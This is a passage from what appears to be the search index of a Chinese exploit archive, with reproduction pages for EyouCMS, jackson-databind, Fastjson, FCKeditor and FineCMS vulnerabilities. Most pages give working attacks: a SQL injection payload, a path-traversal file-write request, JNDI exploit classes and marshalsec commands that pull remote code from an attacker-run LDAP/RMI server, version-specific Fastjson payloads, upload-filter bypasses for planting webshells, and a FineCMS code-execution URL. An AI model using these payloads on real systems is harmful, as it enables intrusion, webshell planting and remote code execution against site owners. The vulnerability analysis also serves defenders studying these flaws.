$data); } } 第307行： M($table)->where(\"$id_name = $id_value\")->cache(true,null,$table)->save($savedata); // 根据条件保存修改的数据 直接将函数头获取的POST传入SQL语句里面： $table = input('post.table/s'); // 表名 $id_name = input('post.id_name/s'); // 表主键id名 $id_value = input('post.id_value/s'); // 表主键id值 $field = input('post.field/s'); // 修改哪个字段 $value = input('post.value/s', '', null); // 修改字段值 漏洞复现 payload： http://0-sec.org/eyou/?m=admin&c=Index&a=changeTableVal post: table=admin&id_name=admin_id&id_value='1'//and//updatexml(1,concat(0x7e,user(),0x7e),1) 四、参考链接 http://www.f4ckweb.top/index.php/archives/47/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-04 18:41:53 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Eyoucms/4.html":{"url":"0day/Eyoucms/4.html","title":"Eyoucms 1.42 后台插件getshell","keywords":"","body":"Eyoucms 1.42 后台插件getshell 一、漏洞简介 需要进后台+知道后台插件密码 二、漏洞影响 三、复现过程 需要知道后台密码+后台插件密码 //如果第一次使用插件，那么密码可以直接设置，如果管理员设置过了，则可以选择爆破 插件有格式限制，可以从官网随便下个，解压后插入php文件重新打包上传 可以看出文件已成功解压到服务器 直接访问403，分析了下受.htaccess影响不能解析，在php文件目录增加该文件并删除php,重新上传该插件，即可解析 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 14:46:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Eyoucms/7.html":{"url":"0day/Eyoucms/7.html","title":"Eyoucms 1.4.3 csrf漏洞","keywords":"","body":"Eyoucms 1.4.3 csrf漏洞 一、漏洞简介 可通过csrf漏洞添加管理员 二、漏洞影响 Eyoucms 1.4.3 三、复现过程 漏洞分析 漏洞触发点在application\\admin\\controller\\Admin.php public function admin_add() { $this->language_access(); // 多语言功能操作权限 if (IS_POST) { $data = input('post.'); if (0 error(\"超级管理员才能操作！\"); } if (empty($data['password']) || empty($data['password2'])) { $this->error(\"密码不能为空！\"); }else if ($data['password'] != $data['password2']) { $this->error(\"两次密码输入不一致！\"); } ... if (empty($data['pen_name'])) { $data['pen_name'] = $data['user_name']; } if (M('admin')->where(\"user_name\", $data['user_name'])->count()) { $this->error(\"此用户名已被注册，请更换\",url('Admin/admin_add')); } else { $admin_id = M('admin')->insertGetId($data); if ($admin_id) { adminLog('新增管理员：'.$data['user_name']); /*同步追加一个后台管理员到会员用户表*/ try { $usersInfo = Db::name('users')->field('users_id')->where([ 'username' => $data['user_name'], 'lang' => $this->admin_lang, ])->find(); if (!empty($usersInfo)) { $r = Db::name('users')->where(['users_id'=>$usersInfo['users_id']])->update([ 'nickname' => $data['user_name'], 'admin_id' => $admin_id, 'is_activation' => 1, 'is_lock' => 0, 'is_del' => 0, 'update_time' => getTime(), ]); !empty($r) && $users_id = $usersInfo['users_id']; } else { // 获取要添加的用户名 ... $users_id = Db::name('users')->insertGetId($AddData); } if (!empty($users_id)) { Db::name('admin')->where(['admin_id'=>$admin_id])->update([ 'syn_users_id' => $users_id, 'update_time' => getTime(), ]); } } catch (\\Exception $e) {} /* END */ $this->success(\"操作成功\", url('Admin/index')); } else { $this->error(\"操作失败\"); } } } 可以看到进队管理员权限进行校验，而没有对提交token进行校验，导致恶意用户可引导管理员点击构造的url进行管理员添加，实际操作可不跳转到管理页面，以免引起怀疑。 漏洞复现 登陆后台，在高级选项>管理员>新增管理员点击之后截包 poc history.pushState('', '', '/') 模拟管理员点击 添加完成 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 14:52:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Eyoucms/8.html":{"url":"0day/Eyoucms/8.html","title":"Eyoucms 1.4.3 任意文件写入","keywords":"","body":"Eyoucms 1.4.3 任意文件写入 一、漏洞简介 可写入html,css,js,txt文件，总体来说比较鸡肋。 二、漏洞影响 Eyoucms 1.4.3 三、复现过程 漏洞分析 漏洞点只对filename进行过滤，而忘了activepath也可以../进行跳转 application/admin/controller/Filemanager.php if (IS_POST) { $post = input('post.', '', null); $content = input('post.content', '', null); $filename = !empty($post['filename']) ? trim($post['filename']) : ''; $content = !empty($content) ? $content : ''; $activepath = !empty($post['activepath']) ? trim($post['activepath']) : ''; ... ... $r = $this->filemanagerLogic->editFile($filename, $activepath, $content); if ($r === true) { $this->success('操作成功！', url('Filemanager/index', array('activepath'=>$this->filemanagerLogic->replace_path($activepath, ':', false)))); exit; } else { ... ... 跟进editFile函数 application/admin/logic/FilemanagerLogic.php public function editFile($filename, $activepath = '', $content = '') { $fileinfo = pathinfo($filename);// pathinfo获取后缀 $ext = strtolower($fileinfo['extension']); ...... /*允许编辑的文件类型*/ if (!in_array($ext, $this->editExt)) { //>>>> return '只允许操作文件类型如下：'.implode('|', $this->editExt); } /*--end*/ $filename = str_replace(\"..\", \"\", $filename);// 仅对filename进行过滤 $file = $this->baseDir.\"$activepath/$filename\"; // 此处直接拼接产生漏洞 if (!is_writable(dirname($file))) { return \"请把模板文件目录设置为可写入权限！\"; } if ('css' != $ext) { $content = htmlspecialchars_decode($content, ENT_QUOTES); $content = preg_replace(\"/(@)?eval(\\s*)\\(/i\", 'intval(', $content);// // $content = preg_replace(\"/\\?\\bphp\\b/i\", \"？ｍｕｍａ\", $content); } $fp = fopen($file, \"w\"); fputs($fp, $content); fclose($fp); return true; } 漏洞复现 poc POST /eyoucms/login.php?m=admin&c=Filemanager&a=newfile&lang=cn HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (X11; Linux i686; rv:67.0) Gecko/20100101 Firefox/67.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 94 Origin: http://127.0.0.1 Connection: close Referer: http://127.0.0.1/eyoucms/login.php?m=admin&c=Filemanager&a=newfile&activepath=%3Atemplate%3Aplugins%3Atest&lang=cn Cookie: home_lang=cn; admin_lang=cn; PHPSESSID=h6k34lgf1svcatllongehqqdt0; workspaceParam=index%7CFilemanager; XDEBUG_SESSION=18705 Upgrade-Insecure-Requests: 1 activepath=%2Ftemplate%2Fplugins%2Ftest/../../../uploads/tmp&filename=newfile.htm&content=test 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 14:52:31 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Eyoucms/9.html":{"url":"0day/Eyoucms/9.html","title":"Eyoucms 1.4.3 后台代码执行漏洞","keywords":"","body":"Eyoucms 1.4.3 后台代码执行漏洞 一、漏洞简介 Eyoucms v1.4.3 版本后台修改模板文件可代码执行 二、漏洞影响 Eyoucms 1.4.3 三、复现过程 从官网下载最新版反复确认v1.4.3暂未修复。利用也很简单直接在高级选项 -> 模板管理 -> 修改pc模板。修改index.htm为例。 回到index页面刷新 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 14:57:12 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/FasterXML jackson/CVE-2019-14540.html":{"url":"0day/FasterXML jackson/CVE-2019-14540.html","title":"（CVE-2019-14540）FasterXML jackson-databind 远程命令执行漏洞","keywords":"","body":"（CVE-2019-14540）FasterXML jackson-databind 远程命令执行漏洞 一、漏洞简介 FasterXML Jackson是美国FasterXML公司的一款适用于Java的数据处理工具。jackson-databind是其中的一个具有数据绑定功能的组件。 FasterXML jackson-databind 2.9.10之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞执行代码。 二、漏洞影响 jackson-databind fastjson 三、复现过程 分析过程 我喜欢用 gradle 来管理项目，先依赖一个最新版的回来 compile 'com.zaxxer:HikariCP:2.4.0' 观察 HikariConfig.java 的setter 和 getter 方法，稍微有点常识的人都能看出， setMetricRegistry 和 setHealthCheckRegistry 里有明显的lookup方法，下一步就是按照标准的剧本去利用一遍了，经典的jndi漏洞利用，老司机应该分分钟就搞定，但我从来没写过利用，就从头学习一下。 利用过程（常见的jndi利用） 首先，我利用的是 ldap 协议，需要在低版本（小于 java8u191）下利用，详细原理我不是很清楚，大致原理就是从远程加载一个 class文件，调用它的构造函数，在构造函数里可以执行任意代码。 然后，借用 https://github.com/ianxtianxt/marshalsec 提供的转发功能，创建 ldap server，作用是转发到另一个 http server 上，使用非常方便。 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8000/#Exploit\" 1389 Listening on 0.0.0.0:1389 然后编译一个 Exploit.class 出来，找个地方放好 public class Exploit { public Exploit() { try { if (System.getProperty(\"os.name\").toLowerCase().startsWith(\"win\")) { Runtime.getRuntime().exec(\"calc.exe\"); } else if (System.getProperty(\"os.name\").toLowerCase().startsWith(\"mac\")) { Runtime.getRuntime().exec(\"open /Applications/Calculator.app\"); } else { System.out.println(\"No calc for you!\"); } } catch (Exception e) { e.printStackTrace(); } } } 然后在 Exploit.class 目录，开一个 http 服务 python -m SimpleHTTPServer 之后使用 jackson 进行反序列化 ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); mapper.readValue(\"[\\\"com.zaxxer.hikari.HikariConfig\\\", {\\\"metricRegistry\\\":\\\"ldap://localhost:1389/Exploit\\\"}]\".getBytes(), Object.class); 或者使用 fastjson 进行反序列化 ParserConfig.global.setAutoTypeSupport(true); JSON.parse(\"{\\\"@type\\\":\\\"com.zaxxer.hikari.HikariConfig\\\",\\\"metricRegistry\\\":\\\"ldap://localhost:1389/Exploit\\\"}\"); 即可触发弹计算器 文中代码的github地址: https://github.com/ianxtianxt/cve-2019-14540-exploit 参考链接 https://www.leadroyal.cn/?p=939 https://www.restran.net/2018/10/29/fastjson-rce-notes/ https://paper.seebug.org/942/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-17 16:40:34 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/FasterXML jackson/CVE-2020-8840.html":{"url":"0day/FasterXML jackson/CVE-2020-8840.html","title":"（CVE-2020-8840）FasterXML jackson-databind 远程代码执行漏洞","keywords":"","body":"（CVE-2020-8840）FasterXML jackson-databind 远程代码执行漏洞 一、漏洞简介 FFasterXML/jackson-databind是一个用于JSON和对象转换的Java第三方库，可将Java对象转换成json对象和xml文档，同样也可将json对象转换成Java对象。 此次漏洞中攻击者可利用xbean-reflect的利用链触发JNDI远程类加载从而达到远程代码执行。 二、漏洞影响 jackson-databind 2.0.0 – 2.9.10.2 经验证fastjson在开启了autoType功能的情况下，影响最新的fastjson v1.2.62版本 三、复现过程 可以在git提交记录中清楚看到利用的具体类 分析下利用链，通过传进参数asText，触发setter，setAsText()函数 随后跟进toObject()函数 最终进到JndiConverter重写的toObjectImp()函数 此时出现经典的JNDI注入，text 刚好就是我们传进的asText，我们可控，从而达到命令执行目的 poc import com.fasterxml.jackson.databind.ObjectMapper; import java.io.IOException; public class Poc { public static void main(String args[]) { ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String json = \"[\\\"org.apache.xbean.propertyeditor.JndiConverter\\\", {\\\"asText\\\":\\\"ldap://localhost:1389/ExportObject\\\"}]\"; try { mapper.readValue(json, Object.class); } catch (IOException e) { e.printStackTrace(); } } } 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-24 14:58:23 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Fastjson/Fastjson 1.2.22-24 反序列化漏洞.html":{"url":"0day/Fastjson/Fastjson 1.2.22-24 反序列化漏洞.html","title":"Fastjson 1.2.22 - 1.2.24 反序列化漏洞","keywords":"","body":"Fastjson 1.2.22 - 1.2.24 反序列化漏洞 一、漏洞简介 二、漏洞影响 Fastjson 1.2.22-24 三、复现过程 0x01 简单介绍 介绍：FastJson是一款由阿里开发的JSON库 影响版本：1.2.22-24 官方通告：https://github.com/alibaba/fastjson/wiki/security_update_20170315 补丁：https://github.com/alibaba/fastjson/commit/d075721cf396d5cb70e24c824b901e3a9a5b342b 本地环境： win10 idea64 2018.2.5 jdk 1.8 fastjson 1.22 FastJson的简单使用 先通过一个简单的demo来熟悉一下FastJson的基本操作。首先创建一个Student类，Student.java： package ka1n4t.test; public class Student { public String name; private int age; public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } } Students有一个公有属性name和一个私有属性age。下面使用一个测试类，将json字符串反序列化成Student对象，learnFJ.java： package ka1n4t.test; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.JSONObject; public class learnFJ { public static void main(String args[]) { String text = \"{\\\"@type\\\":\\\"ka1n4t.test.Student\\\",\\\"name\\\":\\\"ZhangSan\\\",\\\"age\\\":123}\"; Student obj1 = JSON.parseObject(text, Student.class, Feature.SupportNonPublicField); System.out.println(obj1.getName()); } } 结果： 0x02 原理分析 分析POC 先看一下用于反序列化的恶意类evilClass1.java: package ka1n4t.poc; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class evilClass1 extends AbstractTranslet/*ka1n4t*/ { public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) { } public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException { } public evilClass1() throws IOException { Runtime.getRuntime().exec(\"calc\"); } public static void main(String[] args) throws IOException { evilClass1 helloworld = new evilClass1(); } } 其中的构造方法是用exec弹个计算器。看下poc，vulApp1.java： package ka1n4t.poc; import org.apache.commons.io.IOUtils; import org.apache.commons.codec.binary.Base64; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; import java.io.ByteArrayOutputStream; import java.io.File; import java.io.FileInputStream; import java.io.IOException; public class vulApp1 { public static String readClass(String cls){ ByteArrayOutputStream bos = new ByteArrayOutputStream(); try { IOUtils.copy(new FileInputStream(new File(cls)), bos); } catch (IOException e) { e.printStackTrace(); } String result = Base64.encodeBase64String(bos.toByteArray()); return result; } public static void bad_method() { ParserConfig config = new ParserConfig(); final String fileSeparator = System.getProperty(\"file.separator\"); String evil_path = \"D:\\\\Java-App\\\\fastjson-1.2.22\\\\target\\\\classes\\\\ka1n4t\\\\poc\\\\evilClass1.class\"; String evil_code = readClass(evil_path); final String NASTY_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"; String text1 = \"{\\\"@type\\\":\\\"\" + NASTY_CLASS + \"\\\",\\\"_bytecodes\\\":[\\\"\"+evil_code+\"\\\"],\" + \"'_name':'a.b',\" + \"'_tfactory':{ },\" + \"\\\"_outputProperties\\\":{ }}\\n\"; System.out.println(text1); Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); } public static void main(String args[]) { bad_method(); } } 核心部分： String text1 = \"{\\\"@type\\\":\\\"\" + NASTY_CLASS + \"\\\",\\\"_bytecodes\\\":[\\\"\"+evil_code+\"\\\"],\" + \"'_name':'a.b',\" + \"'_tfactory':{ },\" + \"\\\"_outputProperties\\\":{ }}\\n\"; Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); _bytecodes是经过base64编码的evilClass1的字节码文件，NASTY_CLASS是TemplatesImpl类。总结一下这个payload，利用JSON.parseObject反序列化TemplatesImpl类，其中_bytecodes属性是经过base64编码的恶意类字节码文件。 调试分析 下面来分析一下反序列化TemplatesImpl的调用链，首先经过java的反射机制，到达TemplatesImpl类，调用其getOutputProperties()方法： 跟进newTransformer()方法，这个方法是用于创建一个Transformer实例。然后到达getTransletInstance()方法： getTransletInstance()方法用于创建一个translet实例，返回这个translet给newTransformer()，然后被包裹成Transformer对象。跟进一下这个方法，发现其调用了defineTransletClasses()用来加载_bytecodes中的类，接着又调用了_class[_transletIndex].newInstance()将defineTransletClasses()返回的类进行实例化： 先跟进一下defineTransletClasses方法： 可以看到，使用了loader.defineClass()方法用于加载_bytecodes的内容，并将返回的类赋值给_class[i]（这里的i是0）。loader是TemplatesImpl自定义的类，跟进一下： 可以看到TransletClassLoader继承了Java类加载器—ClassLoader类，跟进其defineClass方法，发现直接调用了父类ClassLoader中的方法，所以就不再跟进了。 回到defineTransletClasses方法，其间接调用ClassLoader加载_bytecodes中的内容之后，将加载出来的类赋值给_class[0]，然后结束，回到getTransletInstance方法，再看一下图： 可以看到，455行直接使用了_class[0].newInstance()创建实例，创建的过程中调用了evilClass1构造方法，然后触发了payload： 0x03 复现过程 从github上直接pull下poc：https://github.com/ianxtianxt/fastjson-remote-code-execute-poc 使用idea打开工程，编译test.java： 然后会在target/classes/person下生成test.class文件。用同样的方法编译Poc.java。 配置运行方式 运行Poc： 参考链接 https://www.cnblogs.com/litlife/p/9986427.html 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-17 16:59:22 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Fastjson/1.html":{"url":"0day/Fastjson/1.html","title":"Fastjson <=1.2.47 远程代码执行漏洞","keywords":"","body":"Fastjson 一、漏洞简介 二、漏洞影响 Fastjson 三、复现过程 https://github.com/ianxtianxt/Fastjson-1.2.47-rce 1.2.24 {\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true}} 未知版本(1.2.24-41之间) {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true} 1.2.41 {\"@type\":\"Lcom.sun.rowset.RowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true} 1.2.42 {\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}; 1.2.43 {\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true]} 1.2.45 {\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://localhost:1099/Exploit\"}} 1.2.47 {\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}}} 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-17 16:50:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Fastjson/2.html":{"url":"0day/Fastjson/2.html","title":"Fastjson <=1.2.60 DoS漏洞无损检测+Fastjson与Jackson组建区分","keywords":"","body":"Fastjson 一、漏洞简介 二、漏洞影响 Fastjson 1.2.60 以下版本 三、复现过程 针对Fastjson DoS 漏洞的检测，相对较好识别，但其需要发送 DoS 的请求包，就会有一个时间延迟，但是部分使用者或 SRC平台对 DoS 类漏洞持保守态度。 所以这里提出一种无损检测 Fastjson DoS 漏洞的方法。 首先有以下几种情况： 未知目标是否使用 Fastjson ，但站点有原始报错回显 如果站点有原始报错回显，可以用不闭合花括号的方式进行报错回显，报错中往往会有fastjson的字样 例如 无回显，盲区分 Fastjson 和 Jackson Java 系 Json 处理基本只有 Fastjson 和 Jackson。 由于 Jackson 相对比较严格, 这里可以很好分辨出 Fastjson 和 Jackson 如果请求包中的 json 如下: {\"name\":\"S\", \"age\":21} 追加一个随机 key ,修改 json 为 {\"name\":\"S\", \"age\":21,\"agsbdkjada__ss_d\":123} 这里 Fastjson 是不会报错的, Jackson 因为强制 key 与 javabean 属性对齐,只能少不能多 key, 所以会报错,服务器的响应包中多少会有异常回显 Fastjson： Jackson： 无损检测原理 已经知道目标使用的是 Fastjson ,可以用以下 poc 去检测是否存在 DOS 漏洞 Fastjson \\x\\u001a\\u001a 测试代码: Main.java import com.alibaba.fastjson.JSON; public class Main { public static void main(String[] args) { String payload = \"{\\\"a\\\":\\\"\\\\x\\u001a\\u001a\\\"}\"; System.out.println(payload); Object o = JSON.parseObject(payload); System.out.println(o.getClass()); } } Fastjson pom.xml 4.0.0 tophant tcc 1.0-SNAPSHOT com.alibaba fastjson 1.2.59 Fastjson == 1.2.60，可以看到报错 pom.xml 4.0.0 tophant tcc 1.0-SNAPSHOT com.alibaba fastjson 1.2.60 使用 Burp 测试 在 Burp 中测试可以使用 : eyJhIjoiXHgaGiJ9 (base64解码) 当后端 Fastjson 版本小于 1.2.60 时，使用该请求包不会延时不会报错 使用 {\"a:\"\\x 进行请求就会发生 DOS 以上的检测方式也已经集成到C/ARS产品中，支持漏洞检测。 四、参考链接 https://blog.riskivy.com/%E6%97%A0%E6%8D%9F%E6%A3%80%E6%B5%8Bfastjson-dos%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8A%E7%9B%B2%E5%8C%BA%E5%88%86fastjson%E4%B8%8Ejackson%E7%BB%84%E4%BB%B6/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-17 16:50:11 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/FCKeditor/1.html":{"url":"0day/FCKeditor/1.html","title":"一、查看FCKeditor版本","keywords":"","body":"1.查看FCKeditor版本 一、漏洞简介 1.查看FCKeditor版本 二、影响范围 三、复现过程 http://127.0.0.1/fckeditor/editor/dialog/fck_about.html http://127.0.0.1/FCKeditor/_whatsnew.html 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-10-29 12:57:40 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/FCKeditor/2.html":{"url":"0day/FCKeditor/2.html","title":"二、测试FCKeditor上传点","keywords":"","body":"2.测试FCKeditor上传点 一、漏洞简介 二、影响范围 三、复现过程 FCKeditor/editor/filemanager/browser/default/connectors/test.html FCKeditor/editor/filemanager/upload/test.html FCKeditor/editor/filemanager/connectors/test.html FCKeditor/editor/filemanager/connectors/uploadtest.html FCKeditor/_samples/default.html FCKeditor/_samples/asp/sample01.asp FCKeditor/_samples/asp/sample02.asp FCKeditor/_samples/asp/sample03.asp FCKeditor/_samples/asp/sample04.asp FCKeditor/_samples/default.html FCKeditor/editor/fckeditor.htm FCKeditor/editor/fckdialog.html FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/php/connector.php FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/asp/connector.asp FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/aspx/connector.aspx FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/jsp/connector.jsp FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/aspx/connector.Aspx fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/php/connector.php 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-10-29 12:58:24 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/FCKeditor/3.html":{"url":"0day/FCKeditor/3.html","title":"三、突破上传","keywords":"","body":"上传限制 上传限制的突破方式很多，主要还是抓包改扩展名，%00截断，添加文件头等 文件名限制 二次上传绕过 文件名‘ . ’ 修改为‘ _ ’ FCK在上传了诸如shell.asp;.jpg的文件后，会自动将文件名改为shell_asp;.jpg。可以继续上传同名文件，文件名会变为shell.asp;(1).jpg 提交shell.php+空格绕过 提交shell.php+空格绕过 空格只支持windows系统，linux系统是不支持的，可提交shell.php+空格来绕过文件名限制。 iis6.0突破文件夹限制 Fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=File&CurrentFolder=/shell.asp&NewFolderName=z.asp FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/shell.asp&NewFolderName=z&uuid=1244789975684 FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&CurrentFolder=/&Type=Image&NewFolderName=shell.asp 文件解析限制 通过Fckeditor编辑器在文件上传页面中，创建诸如1.asp文件夹，然后再到该文件夹下上传一个图片的webshell文件，获取其shell。 http://www.0-sec.org/images/upload/201806/image/1.asp/1.jpg 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:24:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/FCKeditor/4.html":{"url":"0day/FCKeditor/4.html","title":"四、列目录","keywords":"","body":"1、FCKeditor/editor/fckeditor.html FCKeditor/editor/fckeditor.html不可以上传文件，可以点击上传图片按钮再选择浏览服务器即可跳转至可上传文件页，可以查看已经上传的文件。 2、根据xml返回信息查看网站目录 http://www.-sec.org/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Image&CurrentFolder=../../../&NewFolderName=shell.asp 3、获取当前文件夹 FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/ 4、游览c盘 /FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=c:/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:27:18 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Finecms/Finecms 5.0.10多重漏洞.html":{"url":"0day/Finecms/Finecms 5.0.10多重漏洞.html","title":"Finecms 5.0.10 多重漏洞","keywords":"","body":"Finecms 5.0.10多重漏洞 一、漏洞简介 二、漏洞影响 Finecms 5.0.10 三、复现过程 1、任意文件上传 用十六进制编辑器写一个有一句话的图片 去网站注册一个账号，然后到上传头像的地方。 抓包，把jepg的改成php发包。 可以看到文件已经上传到到/uploadfile/member/用户ID/0x0.php 2、任意代码执行漏洞 auth下面的分析的时候会说到怎么获取 浏览器输入： http://0-sec.org/index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=cache%20name=MEMBER.1%27];phpinfo();$a=[%271 这个漏洞的文件在/finecms/dayrui/controllers/Api.php的data2() public function data2() { $data = array(); // 安全码认证 $auth = $this->input->get('auth', true); if ($auth != md5(SYS_KEY)) { // 授权认证码不正确 $data = array('msg' => '授权认证码不正确', 'code' => 0); } else { // 解析数据 $cache = ''; $param = $this->input->get('param'); if (isset($param['cache']) && $param['cache']) { $cache = md5(dr_array2string($param)); $data = $this->get_cache_data($cache); } if (!$data) { // list数据查询 $data = $this->template->list_tag($param); $data['code'] = $data['error'] ? 0 : 1; unset($data['sql'], $data['pages']); // 缓存数据 $cache && $this->set_cache_data($cache, $data, $param['cache']); } } // 接收参数 $format = $this->input->get('format'); $function = $this->input->get('function'); if ($function) { if (!function_exists($function)) { $data = array('msg' => fc_lang('自定义函数'.$function.'不存在'), 'code' => 0); } else { $data = $function($data); } } // 页面输出 if ($format == 'php') { print_r($data); } elseif ($format == 'jsonp') { // 自定义返回名称 echo $this->input->get('callback', TRUE).'('.$this->callback_json($data).')'; } else { // 自定义返回名称 echo $this->callback_json($data); } exit; } 